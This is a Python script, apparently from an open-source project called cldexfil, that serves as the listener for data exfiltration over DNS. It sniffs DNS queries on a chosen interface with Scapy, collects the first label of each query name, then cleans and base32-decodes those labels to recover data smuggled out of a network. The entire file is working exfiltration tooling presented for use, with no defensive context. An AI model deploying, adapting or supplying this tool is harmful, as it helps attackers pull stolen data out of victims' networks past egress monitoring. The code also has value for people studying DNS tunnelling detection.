#!/usr/bin/env python
# -*- coding: utf-8 -*-
""" cldexfil.py

    Client-Less Data Exfiltration over DNS
    See https://github.com/e3prom/cldexfil for more information

    :copyright: (c) 2018 Nicolas Chabbey
    :license: GPLv3, see LICENSE for licensing details

"""
from scapy.all import conf, sniff, DNSQR
from base64 import b32decode
from re import match
import argparse


def pkt_handler(packet):
    """Callback Scapy function to extract DNS queries from packets

    Scapy will sniff for packets and send every matching packets to this
    callback function. The DNS query's queries will be extracted from the
    payload and appended to the 'queries' global-scope variable.

    """
    if args.verbose: print(packet.summary())
    if packet.haslayer(DNSQR):
        queries.append(str(packet[DNSQR].qname).split(".")[0])


def printqr_b32(data):
    """Decode base32 encoded data and print them to the screen

    This function decode base32 encoded strings and print them.
    In case of exception, it returns a human-readable error.

    """
    print('\n[*] Decoding exfiltrated data...')
    try:
        print(b32decode(data))
    except TypeError as err:
        print('Cannot decode DNS query: {0}'.format(err))


def sanitize_b32(blob):
    """Sanitize base32 encoded data

    It performs strings concatenation of alphanumeric characters only, so
    invalid characters are simply ignored and will not cause b32decode to later
    throw exceptions. One noteable exception is the padding character '=' which
    is matched as part of the regex.

    The function also add padding when necessary as base32 strings should end
    up on a multiple of 8.

    """
    data = ''.join([char for char in blob if match('^[A-Z0-9=]*$',char)])
    data += '=' * ((8 - len(data) % 8) % 8)
    return data


def start():
    """Main function for program entry

    Print user instructions and start the Scapy's sniffing process.
    Upon the sniffer process interruption, call printqr_b32().

    """
    bpf_filter = 'udp and dst port 53'
    bpf_filter += ' ' + 'and net' + ' ' + args.src

    print('[*] listening on %s for DNS queries') % args.interface
    print('[*] hit CTRL-C to decode data received')

    sniff(store=0, prn=pkt_handler, iface=args.interface, filter=bpf_filter)
    printqr_b32(sanitize_b32(queries))


if __name__ == '__main__':
    conf.verb = 0
    queries = []

    parser = argparse.ArgumentParser(description='Read data exfiltrated through DNS queries.')
    parser.add_argument('interface', help='interface to listen on for DNS queries', default='eth0')
    parser.add_argument('-s', '--src', help='source IPv4 address of DNS queries (CIDR format)', default='0.0.0.0/0')
    parser.add_argument('--verbose', help='enable verbose output', action='store_true')
    args = parser.parse_args()

    start()
